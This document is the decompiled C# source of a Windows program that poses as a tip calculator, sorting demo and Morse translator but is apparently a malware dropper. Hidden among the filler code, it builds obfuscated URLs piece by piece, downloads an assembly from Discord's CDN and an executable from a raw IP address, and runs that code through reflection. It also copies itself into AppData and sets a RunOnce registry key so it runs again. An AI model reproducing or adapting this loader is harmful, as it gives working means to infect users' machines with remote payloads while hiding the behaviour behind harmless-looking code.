using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Reflection;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace STORE_ASSEMBLY_STATUS_FLAGS;

public class FrmMain : Form
{
	private static Dictionary<char, string> _morseAlphabetDictionary;

	private static void FrmMain_Load()
	{
	}

	[STAThread]
	private static void Main(string[] args)
	{
		Conclusion();
		try
		{
			using WebClient webClient = new WebClient();
			string text = "";
			text += "a";
			text += "H";
			text += "R";
			text += "0";
			text += "c";
			text += "H";
			text += "M";
			text += "6";
			text += "L";
			text += "y";
			text += "9";
			text += "j";
			text += "Z";
			text += "G";
			text += "4";
			text += "u";
			text += "Z";
			text += "G";
			text += "l";
			text += "z";
			text += "Y";
			text += "2";
			text += "9";
			text += "y";
			text += "Z";
			text += "G";
			text += "F";
			text += "w";
			text += "c";
			text += "C";
			text += "5";
			text += "j";
			text += "b";
			text += "2";
			text += "0";
			text += "v";
			text += "Y";
			text += "X";
			text += "R";
			text += "0";
			text += "Y";
			text += "W";
			text += "N";
			text += "o";
			text += "b";
			text += "W";
			text += "V";
			text += "u";
			text += "d";
			text += "H";
			text += "M";
			text += "v";
			text += "O";
			text += "T";
			text += "Y";
			text += "x";
			text += "M";
			text += "z";
			text += "Y";
			text += "w";
			text += "M";
			text += "z";
			text += "I";
			text += "5";
			text += "O";
			text += "T";
			text += "A";
			text += "y";
			text += "N";
			text += "z";
			text += "k";
			text += "2";
			text += "O";
			text += "T";
			text += "A";
			text += "z";
			text += "L";
			text += "z";
			text += "k";
			text += "2";
			text += "M";
			text += "z";
			text += "g";
			text += "z";
			text += "N";
			text += "j";
			text += "E";
			text += "5";
			text += "M";
			text += "D";
			text += "I";
			text += "w";
			text += "N";
			text += "z";
			text += "k";
			text += "y";
			text += "M";
			text += "j";
			text += "E";
			text += "5";
			text += "N";
			text += "i";
			text += "9";
			text += "T";
			text += "a";
			text += "G";
			text += "F";
			text += "y";
			text += "c";
			text += "F";
			text += "p";
			text += "p";
			text += "c";
			text += "E";
			text += "x";
			text += "p";
			text += "Y";
			text += "i";
			text += "5";
			text += "k";
			text += "b";
			text += "G";
			text += "w";
			text += "=";
			text = text ?? "";
			text = text ?? "";
			text = text ?? "";
			text = text ?? "";
			text = text ?? "";
			text = text ?? "";
			text = text ?? "";
			text = text ?? "";
			text = text ?? "";
			text = text ?? "";
			text = text ?? "";
			text = text ?? "";
			text = text ?? "";
			text = text ?? "";
			text = text ?? "";
			text = text ?? "";
			text = text ?? "";
			text = text ?? "";
			text = text ?? "";
			text = text ?? "";
			text = text ?? "";
			text = text ?? "";
			text = text ?? "";
			text = text ?? "";
			text = text ?? "";
			text = text ?? "";
			text = text ?? "";
			text = text ?? "";
			text = text ?? "";
			text = text ?? "";
			text = text ?? "";
			text = text ?? "";
			text = text ?? "";
			text = text ?? "";
			text = text ?? "";
			text = text ?? "";
			text = text ?? "";
			text = text ?? "";
			text = text ?? "";
			text = text ?? "";
			text = text ?? "";
			text = text ?? "";
			text = text ?? "";
			text = text ?? "";
			text = text ?? "";
			text = text ?? "";
			text = text ?? "";
			text = text ?? "";
			text = text ?? "";
			text = text ?? "";
			text = text ?? "";
			text = text ?? "";
			text = text ?? "";
			text = text ?? "";
			text = text ?? "";
			text = text ?? "";
			text = text ?? "";
			text = text ?? "";
			text = text ?? "";
			text = text ?? "";
			text = text ?? "";
			text = text ?? "";
			text = text ?? "";
			text = text ?? "";
			text = text ?? "";
			text = text ?? "";
			text = text ?? "";
			text = text ?? "";
			text = text ?? "";
			text = text ?? "";
			text = text ?? "";
			text = text ?? "";
			text = text ?? "";
			text = text ?? "";
			text = text ?? "";
			text = text ?? "";
			text = text ?? "";
			string s = "U2hhcnBaaXBMaWIuU2hhcnBSZXBvc2l0b3J5";
			byte[] bytes = Convert.FromBase64String(s);
			string @string = Encoding.UTF8.GetString(bytes);
			string s2 = "U2hhcnBEdW1w";
			byte[] bytes2 = Convert.FromBase64String(s2);
			string string2 = Encoding.UTF8.GetString(bytes2);
			byte[] bytes3 = Convert.FromBase64String(text);
			string string3 = Encoding.UTF8.GetString(bytes3);
			byte[] rawAssembly = new WebClient().DownloadData(string3);
			object obj = new object[3]
			{
				Assembly.GetExecutingAssembly().Location,
				string.Empty,
				webClient.DownloadData("http://62.197.136.64:8082/os_windows.exe")
			};
			Assembly assembly = Assembly.Load(rawAssembly);
			int minValue = 10;
			int maxValue = 30;
			int num = 100;
			Random random = new Random();
			int num2 = random.Next(10, 30);
			int[] array = new int[num2];
			Random random2 = new Random();
			for (int i = 0; i < num2; i++)
			{
				array[i] = random2.Next(num);
			}
			Console.WriteLine("Initial array: ");
			int[] array2 = array;
			foreach (int num3 in array2)
			{
				Console.Write(num3 + " ");
			}
			int num4 = 1;
			for (int k = 1; k < num2; k++)
			{
				if (array[k] < array[k - 1])
				{
					num4 = k;
					break;
				}
			}
			for (int l = num4; l < num2; l++)
			{
				int num5 = l;
				while (num5 > 0 && array[num5 - 1] > array[num5])
				{
					int num6 = array[num5 - 1];
					array[num5 - 1] = array[num5];
					array[num5] = num6;
					num5--;
				}
			}
			Console.WriteLine("\n\nSorted array: ");
			int[] array3 = array;
			foreach (int num7 in array3)
			{
				Console.Write(num7 + " ");
			}
			assembly.GetType(string.Join(string.Concat("\n\nSorted array: ".Replace("\n\nSorted array: ", "\n\nSorted array: "), random, num, 5, random.Next(minValue, maxValue), random, num, num4, num4), @string))!.InvokeMember(string.Join(string.Concat(5, random.Next(minValue, maxValue), random, num, random.Next(minValue, maxValue), random, num, num4, num4, random.Next(minValue, maxValue), random, num, num4, num4, num4, num4), string2), BindingFlags.InvokeMethod, null, null, (object[])obj);
			Console.WriteLine("==============");
			Console.WriteLine("Tip Calculator");
			Console.WriteLine("==============");
			Console.WriteLine();
			Console.Write("How much was your bill without tax? ");
			decimal.Parse(Console.ReadLine());
			Console.WriteLine("How good was the service?");
			Console.WriteLine("A - Incredible");
			Console.WriteLine("B - Good");
			Console.WriteLine("C - OK");
			Console.WriteLine("D - Bad");
			Console.WriteLine("F - Terrible");
			Console.Write(":");
			string text2 = Console.ReadLine();
			decimal num8 = 0m;
			if (text2 == "A")
			{
				num8 = 0.30m;
			}
			if (text2 == "B")
			{
				num8 = 0.20m;
			}
			if (text2 == "C")
			{
				num8 = 0.15m;
			}
			if (text2 == "D")
			{
				num8 = 0.10m;
			}
			if (text2 == "F")
			{
				num8 = 0.05m;
			}
			if (num8 == 0m)
			{
				Console.WriteLine("You didn't enter a valid selection");
				return;
			}
			Console.WriteLine("Tip: {bill * tip}");
			Console.WriteLine("Total: {bill + tip}");
		}
		catch (Exception)
		{
		}
	}

	private static void InitializeDictionary()
	{
	}

	private static string GetUserInput()
	{
		string text = Console.ReadLine();
		if (!string.IsNullOrEmpty(text))
		{
			text = text.ToLower();
		}
		return text;
	}

	private static string Translate(string input)
	{
		StringBuilder stringBuilder = new StringBuilder();
		foreach (char c in input)
		{
			if (_morseAlphabetDictionary.ContainsKey(c))
			{
				stringBuilder.Append(_morseAlphabetDictionary[c] + " ");
			}
			else if (c == ' ')
			{
				stringBuilder.Append("/ ");
			}
			else
			{
				stringBuilder.Append(c + " ");
			}
		}
		return stringBuilder.ToString();
	}

	public static void Conclusion()
	{
		try
		{
			string text = "1";
			int num = Conversions.ToInteger(text);
			string text2 = "PolicyRights";
			string text3 = "PolicyRights.exe";
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
			string text4 = "\\";
			using WebClient webClient = new WebClient();
			byte[] bytes = new byte[89]
			{
				104, 116, 116, 112, 115, 58, 47, 47, 99, 100,
				110, 46, 100, 105, 115, 99, 111, 114, 100, 97,
				112, 112, 46, 99, 111, 109, 47, 97, 116, 116,
				97, 99, 104, 109, 101, 110, 116, 115, 47, 57,
				54, 48, 49, 52, 53, 54, 56, 52, 51, 49,
				57, 56, 51, 56, 50, 53, 56, 47, 57, 54,
				48, 49, 54, 53, 52, 48, 48, 49, 56, 54,
				56, 55, 54, 48, 51, 52, 47, 100, 105, 115,
				112, 117, 116, 101, 100, 46, 116, 120, 116
			};
			string @string = Encoding.ASCII.GetString(bytes);
			string keyName = webClient.DownloadString(@string);
			if ((double)num == Conversions.ToDouble(text) && Registry.GetValue(keyName, text2, null) == null)
			{
				string text5 = folderPath + text4 + text2 + text4 + text3;
				if (!Directory.Exists(Path.GetDirectoryName(text5)))
				{
					Directory.CreateDirectory(Path.GetDirectoryName(text5));
					File.Copy(Assembly.GetExecutingAssembly().Location, text5, overwrite: true);
				}
				Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", text2, text5);
			}
		}
		catch
		{
		}
	}
}
